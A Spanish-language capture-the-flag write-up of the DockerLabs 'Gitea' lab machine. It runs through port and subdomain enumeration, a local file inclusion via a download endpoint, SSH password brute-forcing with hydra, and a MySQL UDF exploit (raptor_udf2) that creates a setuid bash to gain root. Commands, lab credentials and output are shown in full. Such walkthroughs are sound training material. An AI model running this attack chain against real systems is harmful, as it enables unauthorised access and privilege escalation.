#MAQUINA #DOCKERLABS #MEDIO 
#SUBDOMAINS #LFI #USER_DEFINED_FUNCTIONS #UDF

<hr>

# RECONOCIMIENTO

Vamos a resolver **Gitea** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 08:33 CET
Initiating ARP Ping Scan at 08:33
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 08:33, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:33
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 3000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 08:33, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-21 08:33:00 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)**, **22(SSH)** y **3000** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80,3000 172.17.0.2                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 08:34 CET
Nmap scan report for admin.crosswords.5eEk3r.dl (172.17.0.2)
Host is up (0.000022s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
|_  256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: DaCapoDocs
|_http-server-header: Apache/2.4.58 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=f1c9616806220bb5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=jXsPekrREQa8xtI50h6scYzR6_c6MTc0MjU0MjQ0NjYyNDY4NzQyOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 21 Mar 2025 07:34:06 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=fb3e15b4d55e29bc; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=CZwxQdFQXS5j-4M4S0k0eG0XIls6MTc0MjU0MjQ1MTY0ODY4MjM4OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 21 Mar 2025 07:34:11 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=3/21%Time=67DD166E%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=f1c9616806220bb5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=jXsPekrREQa8xtI50h6scYzR6_c6MTc0MjU0MjQ0NjYyNDY4NzQyOQ;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2021\x20Mar\x202025\x2007:34:06\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20data-theme=
SF:\"gitea-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"
SF:data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG
SF:9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic
SF:3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNv
SF:bnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V
SF:0cy9pbWcvbG9nby5wbm")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Me
SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
SF:et-Cookie:\x20i_like_gitea=fb3e15b4d55e29bc;\x20Path=/;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=CZwxQdFQXS5j-4M4S0k0eG0XIls6MTc0M
SF:jU0MjQ1MTY0ODY4MjM4OQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2021\x20M
SF:ar\x202025\x2007:34:11\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.65 seconds





```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 08:35 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
                                                           


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

Tras enumerar con **gobuster** y un rato, vemos que no parece haber nada.

Vamos a meter `gitea.dl` en el /etc/hosts y enumerar y buscar subdominios.
## HTTP (80)

Con **gobuster**:

```bash
gobuster dir -u http://gitea.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gitea.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,jpg,html,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 302) [Size: 189] [--> /]
/server-status        (Status: 403) [Size: 273]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Al entrar a download, se nos abre un login, y parecen estar las credenciales, pero no hace nada:

```bash
admin@gitea.com : PassAdmin123-
```

Vamos a enumerar subdominios con **wfuzz** :

```bash
wfuzz -u "http://gitea.dl/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.gitea.dl" --hc=301 --hl=315
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gitea.dl/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000019:   200        5504 L   16887 W    265382 Ch   "dev"                                                                                                                    
000009532:   400        10 L     35 W       302 Ch      "#www"                                                                                                                   
000010581:   400        10 L     35 W       302 Ch      "#mail"                                                                                                                  
000047706:   400        10 L     35 W       302 Ch      "#smtp"                                                                                                                  
000103135:   400        10 L     35 W       302 Ch      "#pop3"                                                                                                                  

Total time: 0
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 0
```

Lo añadimos al /etc/hosts.

Vamos a enumerar con **gobuster**:

```bash
gobuster dir -u http://dev.gitea.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.gitea.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/search               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/search/]
/contact.html         (Status: 200) [Size: 49689]
/about.html           (Status: 200) [Size: 123571]
/index.html           (Status: 200) [Size: 265382]
/signup.html          (Status: 200) [Size: 53916]
/assets               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/assets/]
/src                  (Status: 301) [Size: 310] [--> http://dev.gitea.dl/src/]
/pricing.html         (Status: 200) [Size: 49178]
/javascript           (Status: 301) [Size: 317] [--> http://dev.gitea.dl/javascript/]
/signin.html          (Status: 200) [Size: 53297]
/404.html             (Status: 200) [Size: 84362]
/LICENSE              (Status: 200) [Size: 1066]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Vemos un search, que tiene en la barra de búsqueda -> `s3cr3tdir`

Al probar en la web no parece ser un directorio, vamos a meterlo como subdominio a ver.

Es otro subdomio -> **s3cr3tdir.dev.gitea.dl**

Tras enumerar no vemos nada interesante, volvemos a buscar subdominios:

```bash

wfuzz -u "http://gitea.dl/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.s3cr3tdir.dev.gitea.dl" --hc=301 --hl=315
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gitea.dl/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000024:   200        248 L    1280 W     13819 Ch    "admin" 

```

Lo añadimos al /etc/hosts.

Usamos gobuster:

```bash
gobuster dir -u http://admin.s3cr3tdir.dev.gitea.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.s3cr3tdir.dev.gitea.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,jpg,html,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.png            (Status: 303) [Size: 68] [--> /avatars/e64c7d89f26bd1972efa854d13d7dd61]
/admin                (Status: 200) [Size: 19849]
/issues               (Status: 303) [Size: 38] [--> /user/login]
/v2                   (Status: 401) [Size: 50]
/explore              (Status: 303) [Size: 41] [--> /explore/repos]
/Admin.png            (Status: 303) [Size: 68] [--> /avatars/e64c7d89f26bd1972efa854d13d7dd61]
/Admin                (Status: 200) [Size: 19848]
/designer.png         (Status: 303) [Size: 68] [--> /avatars/81c55b8b7796f41a8171e51d362ee7ab]
/designer             (Status: 200) [Size: 27638]
/milestones           (Status: 303) [Size: 38] [--> /user/login]
/notifications        (Status: 303) [Size: 38] [--> /user/login]
/server-status        (Status: 403) [Size: 293]
/Designer.png         (Status: 303) [Size: 68] [--> /avatars/81c55b8b7796f41a8171e51d362ee7ab]
/Designer             (Status: 200) [Size: 27637]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================
```

Al meternos en **explore**, vemos cosas interesantes.
# EXPLOTACION

En el repo **myapp**, vemos que es el repositorio de gitea.dl.

En app.py, podemos ver un método **GET download** con el que gracias al parámetro filename nos podemos descargar archivos.

Adema, en el repo **giteaInfo**, nos leakea una dir de interés.

Uso del endpoint:

```bash
http://gitea.dl/download?filename=/etc/hosts
```

Vemos que las dos primeras direcciones no nos deja, pero el **/opt/info.txt** si.

Usamos **sed** :

```bash
sed -E 's/^user[0-9]+:([^ ]+) -.*$/\1/' info.txt > pass.txt
```

Usamos **hydra**:

```bash
hydra -l designer -P pass.txt ssh://172.17.0.2 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 11:41:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 50 login tries (l:1/p:50), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123 
of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 11 final worker threads did not complete until end.
[ERROR] 11 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 11:41:11
```

YA ESTAMOS COMO DESIGNER.
# ESCALADA PRIVILEGIOS

A la hora de enumerar vemos el puerto 3306 abierto con mysql corriendo por root.

Probando credenciales, vemos que las que encontramos funcionan y tenemos permisos, posible **UDF**:

```bash
mysql -u admin -pPassAdmin123-

MariaDB [(none)]> SHOW GRANTS;
+------------------------------------------------------------------------------------------------------------------------------------------------+
| Grants for admin@localhost                                                                                                                     |
+------------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT SELECT, INSERT, UPDATE, DELETE, EXECUTE ON *.* TO `admin`@`localhost` IDENTIFIED BY PASSWORD '*6B77115C352F8F98A4DD4D3401F18E19D88FC7FC' |
+------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)

```

Buscamos en searchsploit :

```bash
searchsploit udf
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                                                                  | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                                                                 | linux/local/1518.c

```

Descargamos :

```bash
searchsploit -m 1518.c
```

Pasamos a la victima y compilamos:
```bash
 gcc -g -c 1518.c  
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc
```

Lo metemos una vez compilado en la carpeta de los plugins:
```bash
cp /tmp/raptor_udf2.so /usr/lib/mysql/plugin   
```

Comandos en MYSQL:
```bash
mysql -u admin -pPassAdmin123-

MariaDB [(none)]> USE mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.002 sec)

MariaDB [mysql]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.000 sec)

MariaDB [mysql]> 

```

Comprobar :
```bash
MariaDB [mysql]> select do_system('whoami > /tmp/whoami.txt');
+---------------------------------------+
| do_system('whoami > /tmp/whoami.txt') |
+---------------------------------------+
|                                     0 |
+---------------------------------------+
1 row in set (0.001 sec)

```

Aunque aparezca 0, podemos comprobarlo y si todo OK:
```bash
MariaDB [mysql]> select do_system('cp /bin/bash /tmp/bash ; chmod +s /tmp/bash');
+----------------------------------------------------------+
| do_system('cp /bin/bash /tmp/bash ; chmod +s /tmp/bash') |
+----------------------------------------------------------+
|                                                        0 |
+----------------------------------------------------------+
1 row in set (0.002 sec)

```

EJECUTAR :

```bash
designer@b11539ab1ad7:/tmp$ ls
1518.c  1518.o  bash  raptor_udf2.so  uwsgi.sock  whoami.txt
designer@b11539ab1ad7:/tmp$ /tmp/bash -p
bash-5.2# whoami
root
bash-5.2# 
```

**YA ESTAMOS COMO ROOT.**